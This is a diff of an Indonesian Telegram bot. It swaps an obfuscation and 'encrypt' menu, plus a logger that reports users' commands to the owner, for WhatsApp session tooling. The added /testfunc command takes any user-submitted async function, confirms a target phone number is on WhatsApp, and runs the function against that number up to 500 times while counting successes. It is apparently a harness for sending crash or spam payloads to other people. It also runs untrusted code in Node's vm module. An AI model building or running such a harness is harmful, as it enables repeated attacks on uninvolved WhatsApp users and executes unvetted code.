+            await ctx.replyWithPhoto({ url: config.THUMBNAIL_URL }, { caption: text, parse_mode: 'HTML', ...extra });
+        } else {
+            await ctx.reply(text, { parse_mode: 'HTML', ...extra });
+        }
+    } catch (err) {
+        await ctx.reply(text, { parse_mode: 'HTML', ...extra });
+    }
+}
+// ==================== COMMAND /START ====================
+bot.start(async (ctx) => {
+    const userId = ctx.from.id;
+    setUserAccess(userId, true);
+    
+    try {
+
+    await ctx.telegram.sendChatAction(
+        ctx.chat.id,
+        "typing"
+    )
+
+    await new Promise(
+        resolve =>
+        setTimeout(
+            resolve,
+            1000
         )
-    ) return
-
-    await bot.telegram.sendMessage(
-        config.OWNER_ID,
-`<blockquote><b>✅ Bot Telah Di Perbarui</b></blockquote>
-`, { parse_mode: "HTML" } )
-fs.unlinkSync("./update.flag")
+    )
 
 } catch (err) {
 
-    console.log(err)
-
-  }
-}
-// ===================== Clear ========\\\
-const bot = new Telegraf(config.BOT_TOKEN);
-// Plugin
-bot.telegram.setMyCommands([
-    {
-        command: 'start',
-        description: 'Mulai bot'
-    },
-    {
-        command: 'ai',
-        description: 'Chat Ai'
-    },
-    {
-        command: 'chatowner',
-        description: 'Memberi pesan ke owner'
-    },
-    {
-        command: 'broadcast',
-        description: 'khusus owner'
-    }   
-])
-.then(() => {
-    console.log('Success register cmd')
-})
-.catch(console.error)
-
-// =============================
-// LOG AKTIVITAS USER ONLY
-// =============================
-bot.use(async (ctx, next) => {
-
-    // hanya message text
-    if (!ctx.message?.text) {
-        return next()
-    }
-
-    const text =
-        ctx.message.text
-
-    // hanya command
-    if (!text.startsWith("/")) {
-        return next()
-    }
-
-    const user =
-        ctx.from
-
-    const userId =
-        Number(user.id)
-
-    // skip owner
-    if (userId === config.OWNER_ID) {
-        return next()
-    }
-
-    // waktu
-    const waktu =
-        new Date().toLocaleString(
-            "id-ID"
-        )
-
-    // ambil cmd
-    const cmd =
-        text.split(" ")[0]
-
-    // ambil args
-    const args =
-        text.split(" ")
-        .slice(1)
-        .join(" ") || "-"
-
-    // username
-    const username =
-        user.username
-        ? "@" + user.username
-        : "Tidak ada"
-
-    // mention
-    const mention =
-`${ctx.from.first_name}`
-
-    // kirim log ke owner
-    await bot.telegram.sendMessage(
-        config.OWNER_ID,
-`\`\`\`js
-╔═══════ ೋღ 🌺 ღೋ ═══════╗
-     Aktifitas-User-Terdeteksi
-╚═══════ ೋღ 🌺 ღೋ ═══════╝
-👤 USER : ${mention}
-👥 USERNAME : ${username}
-🆔 ID : ${userId}
-⚡ COMMAND : ${cmd}
-🕒 WAKTU : ${waktu}\`\`\`
-`,
-        {
-            parse_mode: "Markdown",
-            disable_web_page_preview: true
-        }
-    ).catch(() => {})
-
-    return next()
-
-})
-
-// =============================
-// MAINTENANCE MIDDLEWARE
-// =============================
-bot.use(async (ctx, next) => {
-
-    const data = JSON.parse(
-        fs.readFileSync(PATH_MAINTENANCE, "utf8")
+    console.log(
+        "Typing Error:",
+        err.message
     )
 
-    const maintenance = data.status
-    const reason = data.reason || "Tidak ada alasan"
+}
+    const menuText = await getMenuText(ctx);
+   
+    
+    await sendWithThumbnail(ctx, menuText, { reply_markup: keyboard1 });
+});
 
-    const userId = Number(ctx.from.id)
+async function getMenuText(ctx) {
 
-    // =============================
-    // OWNER BYPASS
-    // =============================
-    if (userId === config.OWNER_ID) {
-        return next()
-    }
-
-    // =============================
-    // MAINTENANCE OFF
-    // =============================
-    if (!maintenance) {
-        return next()
-    }
-
-    // =============================
-    // USER & PREMIUM TERKENA
-    // =============================
-    return ctx.reply(
-        `\`\`\`js
-═════════•°•⚠️•°•═════════
-⚙️ BOT SEDANG MAINTENANCE
-
-Tunggu hingga maintenance selesai.
-📝 information : ${reason}
-═════════════════════════\`\`\`
-
-`,
-        {
-            parse_mode: "Markdown"
+    const runtime = getBotRuntime();
+    const memory = getMemoryUsage();
+    
+    return `
+<blockquote>𝖮𝗅𝖺𝖺. ${ctx.from.first_name}  𝖨𝗇 𝖡𝗈𝗍 𝖳𝖾𝗌𝗍𝖥𝗎𝗇𝖼</blockquote>
+<blockquote>╭──────▢ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ▢─────╮
+├─▢ 👑 ᴅᴇᴠᴇʟᴏᴘᴇʀ : @SabilOfficial
+├─▢ 🤖 ᴠᴇʀsɪᴏɴ : 𝟣 𝖦𝖾𝗇 𝟤
+├─▢ 💎 ʟᴀɴɢᴜᴀɢᴇ : 𝖩𝖺𝗏𝖺𝖲𝖼𝗋𝗂𝗉t
+├─▢ 🛡 ᴘʀᴇғɪx : /
+├─▢ ⏳ ʀᴜɴᴛɪᴍᴇ : ${runtime}
+╰───────────────────────╯</blockquote>
+<blockquote><b>⪻┉⪼ ᴘᴏᴡᴇʀᴇᴅ ʙʏ @SabilOfficial ⪻┉⪼</b></blockquote>
+    `;
+}
+//// ==================== ACTION CHECK JOIN ====================
+bot.action('check_join', async (ctx) => {
+    const userId = ctx.from.id;
+    const isMember = await checkJoin(userId);
+    
+    if (isMember || userId === config.OWNER_ID) {
+        setUserAccess(userId, true);
+        await ctx.answerCbQuery('✅ Verifikasi berhasil! Akses diberikan.');
+        
+        // Ambil menu text terbaru
+        const menuText = await getMenuText(ctx);
+        
+        // Hapus pesan lama (pesan "Akses Ditolak")
+        try {
+            await ctx.deleteMessage();
+        } catch (err) {
+            console.log('Gagal hapus pesan:', err.message);
         }
-    )
-})
-
-//// simpan mapping pesan owner -> user
-const CHAT_SESSION = {}
-const REPLY_MAP = {}
-const WAITING_UPDATE_LINK = {}
-
-// ==================== DATABASE AKSES ====================
-const ACCESS_FILE = './akses.json';
-
-function loadAkses() {
-    if (!fs.existsSync(ACCESS_FILE)) {
-        fs.writeJsonSync(ACCESS_FILE, { users: {} });
-    }
-    return fs.readJsonSync(ACCESS_FILE);
-}
-
-function saveAkses(data) {
-    fs.writeJsonSync(ACCESS_FILE, data, { spaces: 2 });
-}
-
-function isUserHasAccess(userId) {
-    const data = loadAkses();
-    return data.users[userId] === true;
-}
-
-function setUserAccess(userId, hasAccess) {
-    const data = loadAkses();
-
-    if (hasAccess) {
-        data.users[userId] = true;
+        
+        // Kirim pesan baru dengan thumbnail + menu
+        await sendWithThumbnail(ctx, menuText, { reply_markup: keyboard2 });
+        
     } else {
-        delete data.users[userId];
+        await ctx.answerCbQuery('❌ Kamu belum join channel!', { show_alert: true });
     }
+});
 
-    saveAkses(data);
-}
+// ==================== COMMAND /CONNECT ====================
+bot.command('connect', onlyJoinChannel, async (ctx) => {
+    const userId = ctx.from.id;
+    const args = ctx.message.text.split(/\s+/);
+    const phoneNumber = args[1];
+    
+    if (phoneNumber && phoneNumber.match(/^\d{9,15}$/)) {
+        const senderKey = phoneNumber.replace(/[^0-9]/g, "");
+        if (userSessions.get(userId)?.has(senderKey) && senderStatus.get(senderKey)) {
+            return ctx.reply(`<blockquote>ɴᴜᴍʙᴇʀ <code>${senderKey}</code> ɪs ʀᴇᴀᴅʏ.</blockquote>`, { parse_mode: "HTML" });
+        }
+        await connectNew(senderKey, userId, ctx.chat.id, ctx.telegram);
+    } else {
+        waitingForConnect.set(userId, true);
+        await ctx.reply(
+            `<blockquote><b>sᴇɴᴅ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴏɴ sᴇɴᴅᴇʀ, ᴅᴏɴ'ᴛ ( + )</b></blockquote>`,
+            { parse_mode: 'HTML' }
+        );
+    }
+});
 
-// ==================== THUMBNAIL LOKAL ====================
-async function getThumbnailBuffer() {
+// ==================== HANDLER INPUT NOMOR ====================
+bot.on('text', onlyJoinChannel, async (ctx, next) => {
+    const userId = ctx.from.id;
+    if (waitingForConnect.get(userId)) {
+        waitingForConnect.delete(userId);
+        const phoneNumber = ctx.message.text.trim();
+        if (!phoneNumber.match(/^\d{9,15}$/)) {
+            return ctx.reply(`❌ Format nomor salah! Contoh: <code>6281234567890</code>`, { parse_mode: 'HTML' });
+        }
+        const senderKey = phoneNumber.replace(/[^0-9]/g, "");
+        if (userSessions.get(userId)?.has(senderKey) && senderStatus.get(senderKey)) {
+            return ctx.reply(`❌ Nomor <code>${senderKey}</code> sudah terhubung.`, { parse_mode: "HTML" });
+        }
+        await connectNew(senderKey, userId, ctx.chat.id, ctx.telegram);
+        return;
+    }
+    return next();
+});
+
+// ==================== COMMAND /DISCONNECT ====================
+bot.command('disconnect', onlyJoinChannel, async (ctx) => {
+    const userId = ctx.from.id;
+    const args = ctx.message.text.split(/\s+/);
+    const phoneNumber = args[1];
+    
+    if (!phoneNumber) {
+        return ctx.reply(`<blockquote>⚠️ ʜᴏᴡ ᴛᴏ ᴜsᴇ : /disconnect ɴᴜᴍʙᴇʀ\nᴇxᴀᴍᴘʟᴇ : /disconnect 6281234567890</blockquote>`, { parse_mode: 'HTML' });
+    }
+    
+    const senderKey = phoneNumber.replace(/[^0-9]/g, "");
+    const userSockMap = userSessions.get(userId);
+    const sock = userSockMap?.get(senderKey);
+    
+    if (!sock) {
+        return ctx.reply(`<blockquote>ɴᴜᴍʙᴇʀ <code>${senderKey}</code> ɴᴏᴛ ғᴏᴜɴᴅ ɪɴ ғɪʟᴇ sᴇssɪᴏɴ.</blockquote>`, { parse_mode: "HTML" });
+    }
+    
+    try { await sock.logout(); } catch (e) {}
+    userSockMap.delete(senderKey);
+    senderStatus.delete(senderKey);
+    removeActiveSender(senderKey);
+    try { fs.rmSync(sessionPath(senderKey), { recursive: true, force: true }); } catch (e) {}
+    
+    await ctx.reply(`<blockquote>✅ ɴᴜᴍʙᴇʀ <code>${senderKey}</code> sᴜᴄᴄᴇss ᴅɪsᴄᴏɴɴᴇᴄᴛ.</blockquote>`, { parse_mode: "HTML" });
+});
+
+// ==================== COMMAND /LISTSENDER ====================
+bot.command('listsender', onlyJoinChannel, async (ctx) => {
+    const userId = ctx.from.id;
+    const userSockMap = userSessions.get(userId) || new Map();
+    const all = [...userSockMap.keys()];
+    
+    if (!all.length) {
+        return ctx.reply("<blockquote>ᴛɪᴅᴀᴋ ᴀᴅᴀ sᴇɴᴅᴇʀ ᴀᴋᴛɪғ.\nɢᴜɴᴀᴋᴀɴ /connect ᴜɴᴛᴜᴋ ᴍᴇɴᴀᴍʙᴀʜ sᴇɴᴅᴇʀ.</blockquote>", { parse_mode: "HTML" });
+    }
+    
+    const online = all.filter(k => senderStatus.get(k));
+    const offline = all.filter(k => !senderStatus.get(k));
+    
+    let msg = `<b>📋 DAFTAR SENDER WHATSAPP</b>\n─────────────────────────\n`;
+    msg += `<b>Total   : ${all.length}</b>\n`;
+    msg += `<b>Online  : ${online.length}</b>\n`;
+    msg += `<b>Offline : ${offline.length}</b>\n`;
+    msg += `─────────────────────────\n\n`;
+    
+    msg += online.map(k => `✅ <code>${k}</code> — Online`).join('\n');
+    if (online.length && offline.length) msg += `\n\n`;
+    msg += offline.map(k => `❌ <code>${k}</code> — Offline`).join('\n');
+    
+    await ctx.reply(msg, { parse_mode: "HTML" });
+});
+
+// ==================== COMMAND /STATUS ====================
+bot.command('status', onlyJoinChannel, async (ctx) => {
+    const userId = ctx.from.id;
+    const userSockMap = userSessions.get(userId) || new Map();
+    const online = [...userSockMap.keys()].filter(k => senderStatus.get(k));
+    
+    if (online.length === 0) {
+        await ctx.reply("❌ Tidak ada sender WhatsApp yang online.\nGunakan /connect untuk menambah.", { parse_mode: "HTML" });
+    } else {
+        await ctx.reply(`✅ <b>WhatsApp Terhubung</b>\n\n${online.map(k => `📱 <code>${k}</code>`).join('\n')}`, { parse_mode: "HTML" });
+    }
+});
+
+// ==================== COMMAND /TESTFUNC ====================
+bot.command('testfunc', onlyJoinChannel, async (ctx) => {
+    const userId = ctx.from.id;
+    const rep = ctx.message.reply_to_message;
+    
+    // Validasi reply
+    if (!rep || (!rep.text && !rep.document)) {
+        return ctx.reply(
+            `<blockquote><b>❌ Cara pakai /testfunc</b>\n\n` +
+            `1. REPLY ke pesan berisi kode <b>async function</b>\n` +
+            `2. Atau REPLY ke file <b>.js</b>\n` +
+            `3. Lalu ketik:\n` +
+            `<code>/testfunc 628123456789 10</code>\n\n` +
+            `<b>Contoh function:</b>\n` +
+            `<code>async function test(sock, target) {\n  console.log("test");\n}</code></blockquote>`,
+            { parse_mode: "HTML" }
+        );
+    }
+    
+    const args = ctx.message.text.split(/\s+/);
+    const target = args[1];
+    const loop = Math.min(parseInt(args[2]) || 1, 500);
+    
+    if (!target || !target.match(/^\d{9,15}$/)) {
+        return ctx.reply(`❌ Format salah!\n\n<code>/testfunc 628123456789 10</code>`, { parse_mode: "HTML" });
+    }
+    
+    // Ambil kode function dari reply
+    let funcCode = "";
+    let fileName = "code";
+    
+    if (rep.text) {
+        funcCode = rep.text.trim();
+    } else if (rep.document && rep.document.file_name.endsWith(".js")) {
+        try {
+            funcCode = await downloadTgFile(ctx.telegram, rep.document.file_id);
+            fileName = rep.document.file_name;
+        } catch (e) {
+            return ctx.reply(`❌ Gagal download file: ${e.message}`, { parse_mode: "HTML" });
+        }
+    } else {
+        return ctx.reply(`❌ Reply harus berupa teks kode atau file .js`, { parse_mode: "HTML" });
+    }
+    
+    // Validasi function
+    const match = funcCode.match(/async\s+function\s+(\w+)/);
+    if (!match) {
+        return ctx.reply(
+            `<blockquote>❌ Function tidak valid!\n\n` +
+            `Pastikan menggunakan format:\n` +
+            `<code>async function namaFunc(sock, target) {\n  // kode disini\n}</code></blockquote>`,
+            { parse_mode: "HTML" }
+        );
+    }
+    const funcName = match[1];
+    
+    // Pilih sender (ambil sender online milik user)
+    const userSockMap = userSessions.get(userId) || new Map();
+    const onlineSenders = [...userSockMap.keys()].filter(k => senderStatus.get(k));
+    
+    if (onlineSenders.length === 0) {
+        return ctx.reply(`
+<blockquote>ᴛɪᴅᴀᴋ ᴀᴅᴀ sᴇɴᴅᴇʀ ʏᴀɴɢ ᴛᴇʀʜᴜʙᴜɴɢ.
+ɢᴜɴᴀᴋᴀɴ ᴄᴏᴍᴍᴀɴᴅ /connect ᴜɴᴛᴜᴋ ᴍᴇɴɢʜᴜʙᴜɴɢᴋᴀɴ sᴇɴᴅᴇʀ.</blockquote>`, { parse_mode: "HTML" });
+    }
+    
+    const selectedSender = onlineSenders[0];
+    const activeSock = userSockMap.get(selectedSender);
+    const targetJid = `${target}@s.whatsapp.net`;
+    
+    const loadMsg = await ctx.reply(`🔍 Memeriksa nomor target...`, { parse_mode: "HTML" });
+    
+    // Cek nomor terdaftar
+    let isRegistered = false;
     try {
-        if (await fs.pathExists(config.THUMBNAIL_PATH)) return await fs.readFile(config.THUMBNAIL_PATH);
-        return null;
-    } catch (err) { return null; }
-}
-
-// ==================== KEYBOARD ====================
-const openMenuKeyboard = {
-    inline_keyboard: [
-    [
-      { 
-        text: "👑", 
-        url: "https://t.me/sabilofficial",
-        style: "success" 
-       },
-      { 
-        text: "⇨", 
-        callback_data: "tools_menu", 
-        style: "primary" 
-       } 
-    ]
-  ]
-};
-
-const OwnKb = {
-    inline_keyboard: [
-        [
-         { 
-          text: "⇦", 
-          callback_data: "main_menu",
-          style: "primary"
-         },
-         { 
-          text: "⇨", 
-          callback_data: "tools_menu",
-          style: "danger"
-         }
-       ]
-    ]
-};
-
-const ToolsKeyboard = {
-    inline_keyboard: [
-        [
-         { 
-          text: "⇦", 
-          callback_data: "main_menu",
-          style: "primary"
-         },
-         { 
-          text: "⇨", 
-          callback_data: "enc_menu_v1",
-          style: "danger"
-         }
-       ]
-    ]
-};
-
-const EncV1Keyboard = {
-    inline_keyboard: [
-        [
-         { 
-          text: "⇦", 
-          callback_data: "tools_menu",
-          style: "success"
-         },
-         { 
-          text: "⇨", 
-          callback_data: "enc_menu_v2",
-          style: "primary"
-         }
-       ]
-    ]
-};
-
-const EncV2Keyboard = {
-    inline_keyboard: [
-        [
-         { 
-          text: "⇦", 
-          callback_data: "enc_menu_v1",
-          style: "danger"
-         },
-         { 
-          text: "⇨", 
-          callback_data: "main_menu",
-          style: "success" 
-         }
-       ]
-    ]
-};
-
-// wik wok the tolk
-async function sendEncryptProgress(ctx, waitMsg, modeName) {
-    const steps = [
-        { percent: 20, text: `⚙️ Mengunduh file (mode: ${modeName})`, delay: 600 },
-        { percent: 40, text: `⚙️ PROSES ENCRYPT (${modeName})`, delay: 800 },
-        { percent: 70, text: `⚙️ Encrypting dengan algoritma ${modeName}...`, delay: 800 },
-        { percent: 80, text: `⚙️ Penyelesaian Encrypt... Cukup Lama`, delay: 4000 },
-        { percent: 100, text: `✅ File berhasil diencrypt! (${modeName})`, delay: 500 }
-    ];
-    for (const step of steps) {
-        const barLength = 10;
-        const filled = Math.round((step.percent / 100) * barLength);
-        const bar = '▰'.repeat(filled) + '▱'.repeat(barLength - filled);
-        await ctx.telegram.editMessageText(waitMsg.chat.id, waitMsg.message_id, undefined, `<pre>✅ Encrypt Berjalan\n${step.text}\n${bar} ${step.percent}%</pre>`, { parse_mode: 'HTML' });
-        await new Promise(resolve => setTimeout(resolve, step.delay));
+        const [check] = await activeSock.onWhatsApp(targetJid);
+        isRegistered = !!check?.exists;
+    } catch (err) {
+        console.error("Cek WhatsApp error:", err);
     }
-}
-
-// kacung prime
-async function processObfuscate(
-    ctx,
-    obfuscator,
-    modeName = "default"
-) {
-
-    if (typeof obfuscator !== "function") {
-        console.error(
-            "Obfuscator tidak valid:",
-            obfuscator
-        )
-
-        return ctx.reply(
-            "❌ Obfuscator tidak valid."
-        )
+    
+    if (!isRegistered) {
+        await ctx.telegram.deleteMessage(loadMsg.chat.id, loadMsg.message_id).catch(() => {});
+        return ctx.reply(`<blockquote>ɴᴏᴍᴏʀ <code>${target}</code> ᴛɪᴅᴀᴋ ᴛᴇʀᴅᴀғᴛᴀʀ ᴅɪ ᴡʜᴀᴛsᴀᴘᴘ.</blockquote>`, { parse_mode: "HTML" });
     }
-
-    const userId = ctx.from.id
-
-    if (
-        !isUserHasAccess(userId) &&
-        userId !== config.OWNER_ID
-    ) {
-        return ctx.reply(
-            "❌ Akses ditolak."
-        )
+    
+    // Update loading message
+    const inlineKB = { 
+        inline_keyboard: [
+              [{ text: "Cek Target", url: `https://wa.me/${target}`, style: "danger" }]
+           ] 
+        };
+        
+    await ctx.telegram.editMessageText(
+        loadMsg.chat.id, loadMsg.message_id, null,
+        `<b>🚀 TEST FUNC</b>\n──────────────────\n<b>Target</b> : <code>${target}</code>\n<b>Sender</b> : <code>${selectedSender}</code>\n<b>Loop</b>   : ${loop}x\n<b>Status : Memulai eksekusi...</b>\n──────────────────`,
+        { parse_mode: "HTML", reply_markup: inlineKB }
+    ).catch(() => {});
+    
+    // Sandbox VM
+    const sandboxCtx = vm.createContext({
+        console: console,
+        Buffer: Buffer,
+        sleep: sleep,
+        sock: createSafeSock(activeSock),
+        target: targetJid
+    });
+    
+    let successCount = 0;
+    let failCount = 0;
+    let lastErrMsg = "";
+    const UPDATE_EVERY = Math.max(1, Math.floor(loop / 10));
+    
+    const updateProgress = async (i) => {
+        await ctx.telegram.editMessageText(
+            loadMsg.chat.id, loadMsg.message_id, null,
+            `<b>🚀 TEST FUNC</b>\n──────────────────\n<b>Target</b>  : <code>${target}</code>\n<b>Sender</b>  : <code>${selectedSender}</code>\n<b>Sukses</b>  : ${successCount}\n<b>Gagal</b>   : ${failCount}\n<b>Progress</b> : ${i + 1}/${loop}\n──────────────────\n${lastErrMsg ? `⚠️ Error: ${esc(lastErrMsg.slice(0, 80))}` : "Status: Berjalan..."}`,
+            { parse_mode: "HTML", reply_markup: inlineKB }
+        ).catch(() => {});
+    };
+    
+    try {
+        // Masukkan kode ke sandbox
+        vm.runInContext(funcCode, sandboxCtx);
+        const fn = sandboxCtx[funcName];
+        
+        if (typeof fn !== "function") {
+            throw new Error(`Fungsi "${funcName}" tidak ditemukan.`);
+        }
+        
+        for (let i = 0; i < loop; i++) {
+            try {
+                await fn(createSafeSock(activeSock), targetJid);
+                successCount++;
+                lastErrMsg = "";
+            } catch (err) {
+                failCount++;
+                lastErrMsg = err.message || "Unknown error";
+                console.error(`[testfunc] iter ${i + 1}: ${lastErrMsg}`);
+            }
+            
+            if (i % UPDATE_EVERY === 0 || i === loop - 1) {
+                await updateProgress(i);
+            }
+            if (i < loop - 1) await sleep(1200);
+        }
+    } catch (vmErr) {
+        await ctx.telegram.editMessageText(
+            loadMsg.chat.id, loadMsg.message_id, null,
+            `❌ Error: ${esc(vmErr.message)}`,
+            { parse_mode: "HTML" }
+        ).catch(() => {});
+        return;
     }
+    
+    // Hasil akhir
+    await ctx.telegram.editMessageText(
+        loadMsg.chat.id, loadMsg.message_id, null,
+        `<b>✅ TEST FUNC SELESAI</b>\n──────────────────\n<b>Target</b>  : <code>${target}</code>\n<b>Sender</b>  : <code>${selectedSender}</code>\n<b>Sukses</b>  : ${successCount}\n<b>Gagal</b>   : ${failCount}\n<b>Total</b>   : ${loop}\n──────────────────\n${lastErrMsg ? `⚠️ Last error: ${esc(lastErrMsg.slice(0, 100))}` : ""}`,
+        { parse_mode: "HTML", reply_markup: inlineKB }
+    ).catch(() => ctx.reply(`Selesai! Sukses: ${successCount}, Gagal: ${failCount}`));
+});
+// ==================== Cek Hamil ==========================
+bot.command("cekerror", onlyJoinChannel, async (ctx) => {
 
-    if (!ctx.message.reply_to_message) {
-        return ctx.reply(
-            "❌ Reply file .js"
-        )
-    }
+    const rep = ctx.message.reply_to_message
 
     let code = ""
-    let originalBaseName = "script"
+    let fileName = "code"
 
-    const replied =
-        ctx.message.reply_to_message
+    if (rep?.document) {
 
-    if (replied.text) {
+        const ext = path
+            .extname(rep.document.file_name)
+            .toLowerCase()
 
-        code = replied.text
-        originalBaseName = "code"
+        const allowed = [
+            ".js",
+            ".json",
+            ".html",
+            ".py"
+        ]
 
-    } else if (replied.document) {
+        if (!allowed.includes(ext)) {
 
-        const doc = replied.document
-
-        if (
-            doc.mime_type !==
-                "text/javascript" &&
-            !doc.file_name.endsWith(".js")
-        ) {
             return ctx.reply(
-                "❌ File harus .js"
+                "❌ Format yang didukung:\n.js\n.json\n.html\n.py"
             )
+
         }
 
-        originalBaseName =
-            doc.file_name.replace(
-                /\.[^/.]+$/,
-                ""
+        fileName =
+            rep.document.file_name
+
+        try {
+
+            code =
+                await downloadTgFile(
+                    ctx.telegram,
+                    rep.document.file_id
+                )
+
+        } catch (e) {
+
+            return ctx.reply(
+                `❌ Gagal download file:\n${e.message}`
             )
 
-        const fileLink =
-            await ctx.telegram.getFileLink(
-                doc.file_id
-            )
+        }
 
-        const response =
-            await axios.get(
-                fileLink.href,
-                {
-                    responseType: "text"
-                }
-            )
+    } else if (rep?.text) {
 
-        code = response.data
+        code =
+            rep.text.trim()
 
     } else {
 
         return ctx.reply(
-            "❌ Reply file .js atau kode."
-        )
-
-    }
-
-    const outputFilename =
-        `${String(modeName)
-            .replace(/ /g, "_")
-            .toLowerCase()
-        }-encrypt-${originalBaseName}.js`
-
-    const waitMsg =
-        await ctx.reply(
-            `<pre>▰▱▱▱▱▱▱▱▱▱ 10%</pre>
-⚙️ Memulai Obfuscation: ${modeName}`,
+`
+<blockquote><b>Cara Pakai</b></blockquote>
+<blockquote><b>>Reply kode atau file:
+• .js
+• .json
+• .html
+• .py
+Lalu ketik:</b></blockquote>
+<blockquote><b>/cekerror</b></blockquote>
+`,
             {
                 parse_mode: "HTML"
             }
         )
 
+    }
+
+    if (!code.trim()) {
+
+        return ctx.reply(
+            "❌ Kode kosong."
+        )
+
+    }
+
+    const waitMsg =
+        await ctx.reply(
+            "🔍 Menganalisis Error..."
+        )
+
     try {
 
-        await sendEncryptProgress(
-            ctx,
-            waitMsg,
-            modeName
-        )
-
-        const obfuscated =
-            obfuscator(code)
-
-        const buffer =
-            Buffer.from(
-                obfuscated,
-                "utf8"
-            )
-
-        await ctx.replyWithDocument(
-            {
-                source: buffer,
-                filename: outputFilename
-            },
-            {
-                caption:
-                    `✅ Mode: ${modeName}\n` +
-                    `File berhasil di encrypt`
-            }
-        )
-
-        await ctx.deleteMessage(
-            waitMsg.message_id
-        ).catch(() => {})
-
-    } catch (err) {
-
-        console.error(err)
+        const {
+            errorMsg,
+            errorLine,
+            fixSuggest,
+            annotated,
+            hasError
+        } = analyseCode(code)
 
         await ctx.telegram
-            .editMessageText(
+            .deleteMessage(
                 waitMsg.chat.id,
-                waitMsg.message_id,
-                undefined,
-                `❌ Gagal:\n${err.message}`
+                waitMsg.message_id
             )
             .catch(() => {})
 
-    }
-
-}
-
-bot.start(async (ctx) => {
-    const userId = String(ctx.from.id);
-
-    // Simpan user baru otomatis
-    if (!isUserHasAccess(userId)) {
-        setUserAccess(userId, true);
-
-        console.log(
-            `[NEW USER] ${ctx.from.first_name || 'No Name'} (${userId})`
-        );
-    }
-
-    // Reaction ke pesan /start
-    try {
-        await ctx.telegram.setMessageReaction(
-            ctx.chat.id,
-            ctx.message.message_id,
-            [
-                {
-                    type: 'emoji',
-                    emoji: '🎉'
-                }
-            ]
-        );
-    } catch (err) {
-        console.log('Gagal memberi reaction:', err.message);
-    }
-
-    return showMenu1(ctx);
-});
-
-// ==================== TAMPILAN MENU ====================
-async function showMenu1(ctx, messageId = null) {
-    const bottime = getBotRuntime();
-    const caption = `
-<blockquote><b>╾═━═╼𝑊𝑒𝑙𝑐𝑜𝑚𝑒 𝑇𝑜 𝐼𝑛 𝐵𝑜𝑡 𝑂𝑏𝑓𝑢𝑠𝑐𝑎𝑡𝑒𝑑╾═━═╼</b></blockquote>
-𝑆𝑖𝑠𝑡𝑒𝑚 : 𝐵𝑒𝑏𝑎𝑠 𝐴𝑘𝑠𝑒𝑠
-𝑅𝑢𝑛𝑡𝑖𝑚𝑒 𝐵𝑜𝑡 : ${bottime}
-𝐹𝑖𝑡𝑢𝑟 : 𝑂𝑏𝑓/𝐸𝑛𝑐𝑟𝑦𝑝𝑡 𝐹𝑖𝑙𝑒,𝐶ℎ𝑎𝑡 𝐴𝑖,𝐶𝑒𝑘 𝑒𝑟𝑟𝑜𝑟/𝐶𝑒𝑘 𝐹𝑢𝑛𝑐,𝐷𝑙𝑙.
-<blockquote><b>╾═━═╼Rasulullah ﷺ bersabda╾═━═╼</b></blockquote>
-
-«التاجر الصدوق الأمين مع الأنبياء
-والصديقين والشهداء»
-“Pedagang yang jujur dan amanah akan
-bersama para nabi, orang-orang
-yang benar, dan para syuhada.”
-(HR. Tirmidzi)
-`;
-    const thumb = await getThumbnailBuffer();
-    if (messageId) {
-        // Edit pesan yang sudah ada
-        if (thumb) {
-            await ctx.telegram.editMessageMedia(ctx.chat.id, messageId, undefined, {
-                type: 'photo',
-                media: { source: thumb },
-                caption,
-                parse_mode: 'HTML'
-            }, { reply_markup: openMenuKeyboard });
-        } else {
-            await ctx.telegram.editMessageText(ctx.chat.id, messageId, undefined, caption, {
-                parse_mode: 'HTML',
-                reply_markup: openMenuKeyboard
-            });
-        }
-    } else {
-        // Kirim pesan baru
-        if (thumb) {
-            await ctx.replyWithPhoto({ source: thumb }, { caption, parse_mode: 'HTML', reply_markup: openMenuKeyboard });
-        } else {
-            await ctx.reply(caption, { parse_mode: 'HTML', reply_markup: openMenuKeyboard });
-        }
-    }
-}
-
-async function showMenu2(ctx, messageId = null) {
-    const caption = `
-<blockquote><b>༺ღ༒ 𝖳𝗈𝗈𝗅𝗌 𝖬𝖾𝗇𝗎 ༒ღ༻</b></blockquote>
-<b>▢ /cekfunc Reply 𝖥𝗎𝗇𝖼</b>
-<b>▢ /cekerror Reply file/code</b>
-<b>▢ /infoerror Reply File/code</b>
-<b>▢ /cekidemoji Reply emoji</b>
-<b>▢ /fixerror Reply file/code</b>
-<b>▢ /cleancode Reply File/code</b>
-<b>▢ /ai 𝖢𝗁𝖺𝗍 teks</b>
-<b>▢ /getsource Link Https</b>
-<blockquote>༺ღ༒༺ღ༒ღ༻༒ღ༻</blockquote>
-`;
-    const thumb = await getThumbnailBuffer();
-    if (messageId) {
-        if (thumb) {
-            await ctx.telegram.editMessageMedia(ctx.chat.id, messageId, undefined, {
-                type: 'photo',
-                media: { source: thumb },
-                caption,
-                parse_mode: 'HTML'
-            }, { reply_markup: ToolsKeyboard });
-        } else {
-            await ctx.telegram.editMessageText(ctx.chat.id, messageId, undefined, caption, {
-                parse_mode: 'HTML',
-                reply_markup: ToolsKeyboard
-            });
-        }
-    } else {
-        if (thumb) {
-            await ctx.replyWithPhoto({ source: thumb }, { caption, parse_mode: 'HTML', reply_markup: ToolsKeyboard });
-        } else {
-            await ctx.reply(caption, { parse_mode: 'HTML', reply_markup: ToolsKeyboard });
-        }
-    }
-}
-
-async function EncV1(ctx, messageId = null) {
-    const caption = `
-<blockquote><b>╾═━═╼ 𝖤𝗇𝖼 𝖵𝟣 ╾═━═╼</b></blockquote>
-<b>▢ /artillery Light & Secure 𝗉𝗋𝗈𝗍𝖾𝖼𝗍𝗂𝗈𝗇</b>
-<b>▢ /hardcode Max Protection mode</b>
-<b>▢ /phantom Invisible & Strong code</b>
-<b>▢ /balanced Smart & Stable defense</b>
-<b>▢ /reversed Rename & Shield system</b>
-<b>▢ /rosemary 𝖴𝗅𝗍𝗋𝖺 𝖣𝖾𝖿𝖾𝗇𝗌𝖾 𝗆𝗈𝖽𝖾</b>
-<b>▢ /enctime 𝟥𝟢 (𝟥𝟢 𝗁𝖺𝗋𝗂)</b>
-<b>▢ /hardhtml Encrypt Hard Html</b>
-<blockquote><b>╾═━═╼ 𝖢𝖺𝗋𝖺 𝖯𝖾𝗇𝗀𝗀𝗎𝗇𝖺𝖺𝗇 ╾═━═╼</b></blockquote>
-<b>/enctime 30</b>
-<b>Jadi setiap angka = 1hari</b>
-<b>Jadi kalo 10 = 10hari</b>
-<blockquote>╾═━═━═━═━═━═━═━═━═╼</blockquote>
-`;
